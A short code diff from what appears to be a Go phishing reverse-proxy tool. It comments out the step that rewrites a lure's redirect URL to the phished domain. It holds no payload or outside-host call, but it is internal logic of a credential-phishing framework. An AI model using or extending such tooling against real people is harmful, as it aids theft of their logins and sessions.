@@ -453,9 +453,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
 									}
-									if session.RedirectURL != "" {
-										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
-									}
+									// if session.RedirectURL != "" {
+									// 	session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+									// }
 									session.PhishLure = l
 									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
